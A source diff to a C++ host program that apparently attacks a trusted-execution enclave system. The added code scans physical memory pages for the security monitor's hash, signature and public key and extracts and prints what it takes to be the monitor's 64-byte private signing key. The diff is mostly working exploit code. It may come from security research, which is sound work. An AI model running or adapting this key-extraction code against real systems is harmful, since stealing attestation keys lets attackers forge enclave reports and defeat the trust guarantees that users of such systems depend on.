@@ -5,6 +5,7 @@
 
 #include "host.h"
 
+#include <cstring>
 #include <getopt.h>
 #include <memory>
 #include <stddef.h>
@@ -105,7 +106,7 @@ std::optional<Report> SharedBuffer::get_report_or_set_bad_offset() {
   printf("Testing casting:\n");
 
   __print_bytes(report_s->sm.public_key, PUBLIC_KEY_SIZE);
-  __dump_memory(report_s->sm.public_key, report_s->enclave.hash);
+  __dump_memory(report_s);
   //===========================
   //
   // we might be able to memcopy to the report
@@ -202,11 +203,6 @@ void Host::print_buffer_wrapper(RunData &run_data) {
 
 bool __check_pattern(char buf[0x1000], const byte *pattern,
                      size_t pattern_len) {
-
-  // char pattern[8] = {0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe};
-
-  // uint64_t deadbeef = 0xdeadbeefcafebabe;
-  // size_t pattern_len = sizeof(pattern);
   for (int i = 0; i <= (0x1000 - pattern_len); i++) {
     if (memcmp(&buf[i], pattern, pattern_len) == 0)
       return true;
@@ -220,26 +216,6 @@ static void __print_page(char buf[0x1000], uint64_t addr) {
     printf("%02x ", buf[val]);
   printf("\n");
 }
-/**
- *Either the enclave hash or the SM hash (or both) does not match with expeced.
- *		=== Security Monitor ===
- *Hash:
- *0babf00d0babf00d2d2d2d2d4b4b4b4b87878787969696962e2e2e2e3f3f3f3f5a5a5a5a3c3c3c3c2d2d2d2d4b4b4b4b87878787969696962e2e2e2e3f3f3f3f
- *Pubkey: deadbabedeadbabe2d2d2d2d4b4b4b4b87878787969696962e2e2e2e3f3f3f3f
- *Signature:
- *deadfacedeadface2d2d2d2d4b4b4b4b87878787969696962e2e2e2e3f3f3f3f5a5a5a5a3c3c3c3c2d2d2d2d4b4b4b4b87878787969696962e2e2e2e3f3f3f3f
- *
- *		=== Enclave Application ===
- *Hash:
- *296b1fd3dd2d7a0ed2047c6bd9af4121a9d0090ba6d20c36fe88f15d3153ae95edea680d5ac69dc8eb718a285a3463e824f0749e730995e0c8324c5a0afd57c1
- *Signature:
- *9906b65dcc07496c73d57c21d6ea0cc6c69553902b04f457cdf290b4b9f2bd54a85940c0c3b1293ad2af05d2b4d3eb14783a2a43efbd9ab4c87ccaf329fe0007
- *Enclave Data: 3138303432383933383300
- *		-- Device pubkey --
- *deadcafedeadcafe2d2d2d2d4b4b4b4b87878787969696962e2e2e2e3f3f3f3f
- *Returned data in the report match with the nonce sent.
- *
- * */
 static void __print_bytes(const byte *buf, size_t buf_len) {
   for (size_t i = 0; i < buf_len; i += 1) {
     printf("%02x ", *(buf + i));
@@ -247,11 +223,27 @@ static void __print_bytes(const byte *buf, size_t buf_len) {
   printf("\n");
 }
 
-static void __dump_memory(const byte *pub_key, const byte *enclave_hash) {
+static void __dump_memory(struct report_t *report_s) {
+  // same as the store sequence in sm.c
+  byte *sm_hash = report_s->sm.hash;
+  byte *sm_signature = report_s->sm.signature;
+  byte *sm_pub_key = report_s->sm.public_key;
+  size_t pattern_size = MDSIZE + SIGNATURE_SIZE + PUBLIC_KEY_SIZE;
 
+  byte pattern[pattern_size];
+  std::memcpy(pattern + 0, sm_hash, MDSIZE);
+  std::memcpy(pattern + MDSIZE, sm_signature, SIGNATURE_SIZE);
+  std::memcpy(pattern + MDSIZE + SIGNATURE_SIZE, sm_pub_key, PUBLIC_KEY_SIZE);
+
+  printf("Pattern Created\n");
+  __print_bytes(pattern, pattern_size);
   // Just dump pages:
   char buf[4096] = {0};
   page_stats_t stats;
+
+  // private key size is 64 bytes including public key
+  byte private_key[64] = {0};
+
   for (uint64_t paddr_candidate = 0x200000000; paddr_candidate < 0x1000000000;
        paddr_candidate += 0x1000) {
 
@@ -260,15 +252,37 @@ static void __dump_memory(const byte *pub_key, const byte *enclave_hash) {
       printf("PAddr reading Error\n");
       return;
     }
-    // if pub key exists and no enclave data exists we have the page to the
-    // private key
-    if (__check_pattern(buf, pub_key, PUBLIC_KEY_SIZE) &&
-        !__check_pattern(buf, enclave_hash, MDSIZE))
+    // if hash, signature, pub key sequence exists and no enclave data exists we
+    // have the page to the private key
+    if (__check_pattern(buf, pattern, pattern_size) &&
+        !__check_pattern(buf, report_s->enclave.hash, MDSIZE)) {
       __print_page(buf, paddr_candidate);
-
+      if (__extract_private_key(buf, pattern, pattern_size, private_key)) {
+        printf("Private Key Found:\n");
+        __print_bytes(private_key, 64);
+      } else {
+        printf("Private Key Not Found:\n");
+      }
+    }
     // maybe compare with the public key to see that we can reach the page
     // the public key is in the report given by the enclave i beleive
   }
+}
+
+static bool __extract_private_key(const char buf[0x1000], byte *pattern,
+                                  size_t pattern_size, byte *private_key) {
+
+  printf("Extracting private key...\n");
+  for (int i = 0; i <= (0x1000 - pattern_size); i++) {
+    if (memcmp(&buf[i], pattern, pattern_size) == 0) {
+      // found the whole pattern now we need the next PRIVATE_KEY_SIZE
+      // bytes in the private key variable
+      memcpy(private_key, (buf + i), 64);
+      // private key size is 64 bytes including public key
+      return true;
+    }
+  }
+  return false;
 }
 
 void Host::print_value_wrapper(RunData &run_data) {
